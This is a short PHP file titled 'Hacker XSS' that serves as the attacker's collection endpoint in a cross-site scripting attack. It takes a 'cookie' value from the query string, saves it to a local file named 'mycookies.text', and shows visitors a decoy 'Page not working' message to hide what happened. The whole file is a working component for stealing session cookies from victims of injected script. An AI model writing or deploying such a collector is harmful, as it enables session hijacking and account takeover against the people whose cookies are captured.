<?php
	$cookie = $_GET['cookie'];
	file_put_contents('mycookies.text', $cookie);
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Hacker XSS</title>
</head>
<body>
	<h1>Page not working</h1>
</body>
</html>